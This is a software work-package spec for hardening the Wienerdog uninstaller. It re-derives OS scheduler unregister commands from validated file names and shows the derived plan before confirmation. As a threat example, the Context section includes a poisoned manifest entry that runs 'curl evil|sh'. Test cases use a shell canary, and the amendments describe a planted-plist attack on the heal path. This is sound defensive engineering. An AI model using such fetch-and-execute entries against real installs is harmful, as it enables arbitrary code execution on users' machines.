---
id: WP-145
title: Re-derive scheduler unload commands from platform + validated identity, and show the derived uninstall plan before confirmation
status: In-Review
model: opus
size: M
depends_on: [WP-144]
adrs: [ADR-0004, ADR-0019, ADR-0027]
branch: wp/145-scheduler-unload-rederive-and-show-plan
---

# WP-145: Scheduler-entry hardening + show-before-confirm (audit A8, part 2 of 2)

## Context (read this, nothing else)

Wienerdog registers nightly jobs with the OS scheduler (launchd on macOS,
systemd user timers on Linux, Task Scheduler on Windows) and records each as a
`scheduler-entry` manifest entry. On `wienerdog uninstall`, the reverser must
**unregister** the entry from the OS, then remove the schedule file.

Today the reverser executes an **argv stored on the entry** (`entry.unload`),
e.g. `['launchctl','bootout','gui/501/ai.wienerdog.dream']`. The install manifest
is an editable plaintext file, so a poisoned entry
`{kind:'scheduler-entry', path:'…', unload:['/bin/sh','-c','curl evil|sh']}`
would make uninstall spawn arbitrary code. Audit action **A8** (P1) requires:
**never execute stored arbitrary argv — re-derive the unregister command from the
platform plus a validated entry identity**, and **display every derived
command/path/effect before confirmation** (`--yes` must not widen what is valid).

This reversal of the WP-013/WP-071 store-then-execute design is ratified in
**ADR-0027** (owner-approved 2026-07-18) — respect it: the reverser takes no
executable input from the manifest; the unregister command is code-owned and
re-derived. `manifest.js` gains no static scheduler dependency (the derivation
is delegated to the platform generator layer, required lazily / injected).

**Owner walkthrough (2026-07-18): Ready.** The design core — re-derive the
unregister command, never execute manifest-stored argv — is the ADR-0027
decision the owner ratified; this WP only decomposes it into contracts and
introduces no new fork. Depends on WP-144 (shares the manifest reverser).

This is **part 2 of 2** for A8. Part 1 (WP-144, a dependency) added strict
per-kind schema, per-entry error isolation, and root-bounded deletes for the
non-scheduler kinds. This WP hardens the `scheduler-entry` kind and adds the
show-the-derived-plan-before-confirm step in `uninstall`.

**IRON RULE (ADR-0004): Wienerdog is just files** — the reverser's only job is to
unregister and delete; it must be inert against a hostile manifest.

## Current state

`src/core/manifest.js`:
```js
function reverseSchedulerEntry(entry, dryRun, removed, skipped, removedSet) {
  if (Array.isArray(entry.unload) && entry.unload.length > 0) {
    if (dryRun) {
      process.stdout.write(`wienerdog: would run: ${entry.unload.join(' ')}\n`);
    } else {
      try { require('../scheduler/spawn').schedulerSpawn(entry.unload); } catch { /* best-effort */ }
    }
  }
  if (!isFile(entry.path)) { skipped.push(entry.path); return; }
  if (!dryRun) fs.rmSync(entry.path, { force: true });
  removedSet.add(entry.path);
  removed.push(entry.path);
}
```
`reverseSchedulerEntry` is exported and dispatched from `reverse()` at the
`entry.kind === 'scheduler-entry'` branch. WP-144 leaves this branch untouched.

**How schedule files are named** (`src/scheduler/generators.js`; the identity
this WP re-derives the unload argv from):
- **launchd (darwin):** `label = 'ai.wienerdog.' + jobStem`; plist filename =
  `${label}.plist`. Unregister = `['launchctl','bootout','gui/'+uid+'/'+label]`,
  `uid = process.getuid()`.
- **systemd (linux):** `unitBase = 'wienerdog-' + jobStem`; the `.timer` file is
  `${unitBase}.timer` and the `.service` file is `${unitBase}.service`.
  Only the `.timer` unregisters: `['systemctl','--user','disable','--now',unitBase+'.timer']`.
  The `.service` entry is recorded with `unload:null` (no unregister needed).
- **Windows (win32):** XML filename = `'wienerdog-' + jobStem + '.xml'` (in
  `<core>/schedules/`); `taskName = '\\Wienerdog\\' + jobStem`. Unregister =
  `['schtasks','/delete','/tn',taskName,'/f']`.

`jobStem` is always validated at register time to `^[a-z0-9][a-z0-9-]*$` (or the
built-in stems `dream`, `catchup`, `daily-digest`, etc. which all match it).

`src/scheduler/spawn.js` exports `schedulerSpawn(argv)` — the single OS-scheduler
mutation chokepoint (honors `WIENERDOG_LOADER_NOOP` / `WIENERDOG_TEST_NO_REAL_SCHEDULER`).

`src/cli/uninstall.js` — the interactive (non-dry-run, non-`--yes`) path prints
only `[<kind>] <path>` (two-space indented) per entry, then prompts, then reverses. The `--dry-run`
path already calls `reverse(..., {dryRun:true})` (which prints the "would run"
lines) and returns before any mutation.

## Deliverables (permission boundary — touch ONLY these)

<!-- Always allowed without listing: this spec file, docs/specs/ROADMAP.md, package-lock.json. -->

| Action | Path | Notes |
|--------|------|-------|
| modify | src/scheduler/generators.js | Add pure `deriveUnloadArgv(schedulePath, platform, env)` that reconstructs the unregister argv from the file's basename identity + platform; returns `string[]` or `null`. Additive export. |
| modify | src/core/manifest.js | Rewrite `reverseSchedulerEntry` to IGNORE `entry.unload` and instead call `deriveUnloadArgv` (lazy require, like the current spawn require); bound the schedule-file removal to its scheduler root; keep spawn best-effort. |
| modify | src/cli/uninstall.js | Before the confirm prompt (interactive path), print the derived plan (reuse `reverse(..., {dryRun:true})` enumeration incl. the derived "would run" lines) so the user sees every derived command/path before consenting; `--yes` skips only the prompt, never widens validity. |
| modify | tests/unit/manifest.test.js | Adversarial cases below. |
| modify | tests/unit/uninstall.test.js | Prove the derived plan is shown before confirm and a poisoned `unload` never spawns. |
| modify | src/scheduler/status.js | Fix-pass (2026-07-19): read-only probe re-derived from identity+platform; NEVER read `entry.unload`; heal only CONFIGURED jobs by REGENERATING canonical content from config and registering that verified artifact — never register a found in-root file (A2, [R2:F34]). |
| modify | src/cli/schedule.js | Fix-pass: `remove()` is a 2nd production caller of `reverseSchedulerEntry` with a duplicated `schedulerRoots`; mirror the root-set + validate-before-spawn (A3). |
| modify | tests/unit/scheduler-status.test.js | Fix-pass: a poisoned `entry.unload` never spawns via the heal path; out-of-root path ⇒ zero probe/reload (A2). |
| modify | tests/unit/scheduler-schedule.test.js | Fix-pass: `schedule remove` mirrors the reverser containment + validate-before-spawn ordering (A1/A3). |

### Exact contracts

**`deriveUnloadArgv(schedulePath, platform, env)` → `string[] | null`** (pure;
`env` defaults to `process.env`, `platform` injected for tests — never mock
`process.platform`). It reads ONLY `path.basename(schedulePath)` and the
platform; it never reads `entry.unload`.

- `platform === 'darwin'`: basename must match `^(ai\.wienerdog\.[a-z0-9][a-z0-9-]*)\.plist$`.
  On match → `['launchctl','bootout','gui/'+uid+'/'+label]` where `label` is the
  capture group and `uid` is `process.getuid()` (guard: if `process.getuid` is
  undefined, return `null` — no unregister, just file removal). No match → `null`.
- `platform === 'linux'`: basename `^(wienerdog-[a-z0-9][a-z0-9-]*)\.timer$` →
  `['systemctl','--user','disable','--now', base+'.timer']` (capture = `base` =
  `wienerdog-<stem>`). A `.service` basename (`^wienerdog-…\.service$`) or any
  other → `null` (the `.service` needs no unregister; file removal still happens).
- `platform === 'win32'`: basename `^wienerdog-([a-z0-9][a-z0-9-]*)\.xml$` →
  `['schtasks','/delete','/tn','\\Wienerdog\\'+stem,'/f']` (capture = `stem`).
  No match → `null`.
- Any other platform, or a basename that does not match the platform's pattern →
  `null` (fail safe: skip the unregister, still remove the file). The regexes are
  **fully anchored** so `/`, `\`, `..`, and spaces in the stem can never appear in
  the derived argv.

**`reverseSchedulerEntry` rewrite:**
```js
function reverseSchedulerEntry(entry, dryRun, removed, skipped, removedSet, opts) {
  // opts carries { platform, schedulerRoots } computed once in reverse() (below).
  const argv = require('../scheduler/generators').deriveUnloadArgv(entry.path, opts.platform);
  if (argv) {
    if (dryRun) {
      process.stdout.write(`wienerdog: would run: ${argv.join(' ')}\n`);
    } else {
      try { require('../scheduler/spawn').schedulerSpawn(argv); } catch { /* best-effort */ }
    }
  }
  // Bound the file removal: entry.path must resolve inside a known scheduler root
  // (launchAgentsDir / systemdUserDir / <core>/schedules) AND its basename must be
  // a recognized wienerdog schedule name (argv!==null covers plist/timer/xml;
  // additionally allow a wienerdog-*.service under the systemd root). Otherwise
  // preserve with a notice — a poisoned path outside these roots is never deleted.
  if (!withinSchedulerRoot(entry.path, opts.schedulerRoots)) {
    process.stderr.write(`wienerdog: preserving ${entry.path} — not a recognized Wienerdog schedule file\n`);
    skipped.push(entry.path);
    return;
  }
  if (!isFile(entry.path)) { skipped.push(entry.path); return; }
  if (!dryRun) fs.rmSync(entry.path, { force: true });
  removedSet.add(entry.path);
  removed.push(entry.path);
}
```
Add `withinSchedulerRoot(p, roots)`: realpath-aware containment (reuse the
module's `contains`) AND a basename check accepting
`^ai\.wienerdog\..*\.plist$` | `^wienerdog-.*\.(timer|service|xml)$`. Out of any
root, or a non-matching basename → `false` (preserve).

In `reverse()`, compute once (lazy `require` of generators for the root dirs, or
inline the two home-relative paths to avoid the import — implementer's choice,
recorded under "Decisions made"):
```js
const platform = process.platform;
const schedulerRoots = [
  require('../scheduler/generators').launchAgentsDir(paths.home), // ~/Library/LaunchAgents
  require('../scheduler/generators').systemdUserDir(paths.home, process.env), // ~/.config/systemd/user
  path.join(paths.core, 'schedules'), // Windows task XML
];
```
and pass `{ platform, schedulerRoots }` to `reverseSchedulerEntry`. (Note:
`generators.js` may `require` `manifest.js` — verify there is no require cycle;
if there is, inline `launchAgentsDir`/`systemdUserDir` equivalents in `reverse()`
from `paths.home` per the JSDoc in generators.js: `~/Library/LaunchAgents` and
`$XDG_CONFIG_HOME||~/.config` + `/systemd/user`. Record the choice in the PR.)

**`uninstall.js` show-before-confirm:** in `run(argv)`, on the interactive path
(not `--dry-run`, not `--yes`), BEFORE calling `confirm(...)`, print a "Planned
actions:" section by invoking `manifestLib.reverse(paths, manifest, {dryRun:true})`
and `manifestLib.disposeCoreMechanics(paths, {dryRun:true, vaultPath})` and
echoing their derived output (the same lines `--dry-run` shows, including each
`wienerdog: would run: …` derived unregister command). Then prompt. The
subsequent real reversal is unchanged. With `--yes`, skip only the prompt — the
set of valid actions is identical (the dry-run enumeration is not a gate that
`--yes` bypasses; it is disclosure). Keep output idempotent-friendly and do not
double-count in the final "Removed N" line.

## Implementation notes & constraints

- Zero new dependencies; plain Node ≥ 18, JSDoc types only.
- `manifest.js` must stay free of a STATIC scheduler import — keep the `require`
  lazy (as the current code does for `spawn`). If a require cycle blocks calling
  `generators.launchAgentsDir` from `reverse()`, inline the two paths from
  `paths.home`/`process.env` and note it.
- Best-effort unregister semantics are preserved: a `null` derivation or a
  non-zero/erroring spawn must NOT stop the file removal or the uninstall.
- A legitimate uninstall must unregister and remove exactly as before (the
  derived argv for a real `ai.wienerdog.dream.plist` equals the historically
  stored one). Prove with an existing scheduler-uninstall test still passing.
- When uncertain, choose the simpler option and record it under "Decisions made".

## Security checklist

- [ ] `entry.unload` is NEVER read or executed; the unregister argv is
      re-derived from `path.basename` + platform through fully-anchored regexes
      that cannot carry `/`, `\`, `..`, or spaces into the argv.
- [ ] A poisoned `{kind:'scheduler-entry', unload:['/bin/sh','-c','…']}` spawns
      nothing — the derivation ignores `unload` and, for a path outside the
      scheduler roots or with an unrecognized basename, removes nothing either.
- [ ] The schedule-file removal is realpath-bounded to the launchd/systemd/core
      scheduler roots with a wienerdog basename check; out-of-bounds → preserved.
- [ ] The interactive uninstall shows every derived command/path/effect before
      the confirm prompt; `--yes` skips only the prompt, not any validation.

## Acceptance criteria

- [ ] `deriveUnloadArgv('~/Library/LaunchAgents/ai.wienerdog.dream.plist','darwin')`
      (with a stubbed uid) → `['launchctl','bootout','gui/<uid>/ai.wienerdog.dream']`;
      `deriveUnloadArgv('…/wienerdog-daily-digest.timer','linux')` →
      `['systemctl','--user','disable','--now','wienerdog-daily-digest.timer']`;
      `deriveUnloadArgv('…/wienerdog-dream.xml','win32')` →
      `['schtasks','/delete','/tn','\\Wienerdog\\dream','/f']`;
      a `.service` and any non-matching basename → `null`.
- [ ] A manifest entry with `unload:['/bin/sh','-c','touch <canary>']` reverses
      with the canary NEVER created (the stored argv is never spawned), and — when
      its `path` is a real `ai.wienerdog.dream.plist` under the launchd root — the
      correct derived `launchctl bootout` is what would run (assert via the
      injected loader / `WIENERDOG_LOADER_NOOP`).
- [ ] A `{kind:'scheduler-entry', path:'<home>/Library/LaunchAgents/com.apple.something.plist'}`
      (recognized root, but not a wienerdog basename) is preserved, not deleted,
      and produces no unregister.
- [ ] The interactive uninstall prints the derived `would run:` lines before the
      `[y/N]` prompt (assert the ordering in captured stdout).
- [ ] A legitimate scheduler uninstall still unregisters + removes the file
      exactly as before this WP.
- [ ] `npm test` and `npm run lint` are green.

## Verification steps (run these; paste output in the PR)

```bash
npm test -- --test-name-pattern "manifest|uninstall|scheduler"
npm test
npm run lint
```

## Out of scope (do NOT do these)

- The non-scheduler bounded-delete + schema + per-entry isolation — **WP-144**
  (this WP depends on it; do not re-implement it).
- Changing how schedule entries are WRITTEN (`schedule.js`/`generators.js`
  register path). This WP only changes derivation-on-reverse and one additive
  pure helper. The stored `entry.unload` may remain on entries (ignored for
  execution everywhere). **Fix-pass 2026-07-19 (A2): the earlier claim that
  `status.js` may keep reading `entry.unload` for "display" is WITHDRAWN — it
  executes it via `reloadMissing`; `status.js` now re-derives probe/reload argv
  too (see Fix-pass amendments).**
- The managed-block separator fidelity bug — **WP-147**.

## Definition of done

1. All verification steps pass locally; output pasted into the PR body.
2. Branch `wp/145-scheduler-unload-rederive-and-show-plan`; conventional commits;
   PR titled `fix(uninstall): re-derive scheduler unload from validated identity + show plan before confirm (WP-145)`.
3. PR template filled, including "Decisions made" (or "none") and `Generated-by:`.
4. This spec's `status:` flipped to `In-Review` in the same PR.

## Fix-pass amendments (2026-07-19)

Review found the unregister still spawns before validation, and — the bigger gap
— **ADR-0027 is not actually closed**: a second caller still executes stored
`entry.unload`. Full implementer contract + tests: `FIX-PLAN.md` cluster **C7**.
Real files: `src/core/manifest.js`, `src/scheduler/status.js`,
`src/scheduler/generators.js`, `src/cli/schedule.js` (the report said
`src/cli/…`).

### A1 — spawn-before-check [Codex HIGH, verified]

`reverseSchedulerEntry` derives the argv (L281) and fires `schedulerSpawn`
(L289) **before** `withinSchedulerRoot` (L299). A recognized-basename-but-
out-of-root entry runs `launchctl bootout` before the root gate — violating this
WP's own "out-of-root spawns nothing." **Corrected contract (the spec already
intends this; the code ordered it wrong):** validate `withinSchedulerRoot` +
recognized basename **first**; only then derive + spawn + remove. Out-of-root /
unrecognized ⇒ preserve, spawn nothing, derive nothing.

### A2 — `status.js` heal path also re-derives (close ADR-0027) [Codex HIGH, verified]

This WP's original "Out of scope" said `entry.unload` "still used by
`scheduler/status.js` display — do not remove it." That was **wrong**:
`status.js` `describeEntry` (L21-53) reads `entry.unload` into a **reload** argv
that `reloadMissing` (L201, sync-time self-heal) **executes** via
`schedulerSpawn`, and `probeAll` spawns a probe from it too. So the ADR-0027
"never execute manifest-stored argv" claim is open on the heal path.
**Corrected contract:** `entry.unload` is never read into any executed argv, on
any path. The **probe** (read-only) is re-derived from identity+platform
(`deriveProbeArgv` in `generators.js`, fully-anchored). Rewrite `status.js` to
use it and gate every spawn behind the scheduler-root check. **This expands this
WP's scope** to `src/scheduler/status.js` + `tests/unit/scheduler-status.test.js`
(added to Deliverables) — coherent because it completes ADR-0027.

**[R2:F34] The heal must REGENERATE canonical content, not register a found
in-root file [Codex CRITICAL].** The first draft re-derived the *identity* but
still passed an in-root **file** to `launchctl bootstrap` / `schtasks /xml` /
systemd load. Containment validates **location only** — not provenance, file
type, job membership, or bytes. A manifest attacker adds a recognized in-root
`ai.wienerdog.evil.plist` (or a static in-root symlink, or an ordinary malicious
plist with arbitrary `ProgramArguments`), makes the probe report it "missing,"
and trusted `sync` **registers it** — no scheduler-registration capability
needed, because `sync` does the registering. **Corrected heal algorithm:**
1. Enumerate **CONFIGURED, code-recognized** jobs (from `jobs.js` / validated
   config) — do NOT iterate manifest entries to decide what to heal; an unknown
   entry is never healed.
2. For a configured job whose registration is missing (per the read-only probe):
   **regenerate** the canonical plist/unit/xml from live validated config via the
   SAME `generators.js` renderers `registerPlatform` uses; write it atomically
   (temp+rename) to the canonical path after confirming that path is a **regular,
   non-symlink** in-root file; **byte-verify** the written artifact.
3. Register from the just-written canonical path, **minimizing the window** (no
   work between byte-verify and register).
Reuse `schedule.js`'s regenerate-then-register path; `status.js` must not have a
"load whatever file is there" branch.

**[R5/R6] The heal is EXCLUDED from the catch-up entry entirely.** `reloadMissing`
re-registers missing CANONICAL per-job entries under attended `sync`, but per
WP-160 [R6] it must **not** create, authorize, or reload the **catch-up** entry at
all — catch-up register/repair/teardown is owned solely by `repointSchedules`
(which runs in the same attended `sync` and both (re)binds the map AND repairs a
missing loaded registration). This gives the missing-catch-up-registration case a
single coherent owner and keeps the authorization anchor (the digest map)
attended-only. See WP-160's attended-authorization boundary table.

**[R3:#1] Honest residual — the verify→register reopen race is A12, not closed
here.** After byte-verifying the regenerated file, `launchctl`/`schtasks`/
`systemd` **reopen the pathname** to register it; a concurrent writer can swap the
file (or a parent dir) between verify and register. So "the scheduler receives
that exact regenerated artifact" is **not** guaranteed and must **not** be
claimed. This is the **same class as the launcher hash-then-reopen /
verify-to-use race** already deferred to A12 (WP-157 A7): it requires an **active
concurrent writer at heal time** = native/same-user code, **not** a static scoped
write — and a *static* planted file IS defeated (regenerate-from-config +
configured-jobs-only, which is F34's real value). Do **not** redesign this into a
platform inode-binding mechanism (out of scope). Add this race to ADR-0028's
residual list (next to the 2b / verify-to-use residual) and to WP-159's
THREAT-MODEL residuals. **Tests:** (i) poisoned
`unload:['/bin/sh','-c','touch <canary>']` on a real in-root dream plist ⇒ heal
regenerates+registers the canonical dream plist, canary never appears; (ii) a
recognized in-root `ai.wienerdog.evil.plist` that is NOT a configured job ⇒ NOT
healed/registered (zero register spawn for it); a static in-root symlink at a
recognized name ⇒ not registered; (iii) out-of-root ⇒ zero probe/heal.

### A3 — boundary: `schedule.js` remove() [wd P1]

`src/cli/schedule.js` `remove()` (L512-522) is a 2nd production caller of
`reverseSchedulerEntry` with a **byte-duplicated** `schedulerRoots`; the root-set
+ validate-before-spawn change must be mirrored here or `schedule remove`
diverges from uninstall. Added to Deliverables:
`src/cli/schedule.js` + `tests/unit/scheduler-schedule.test.js`.

### ADR-0027 amendment (see the ADR file)

The decision's "uninstall reverser" scope is broadened to **all**
scheduler-mutation paths (uninstall reverse, `schedule remove`, sync-time heal
probe + reload). The "Out of scope" note in this spec permitting `status.js` to
keep reading `entry.unload` is **withdrawn**.
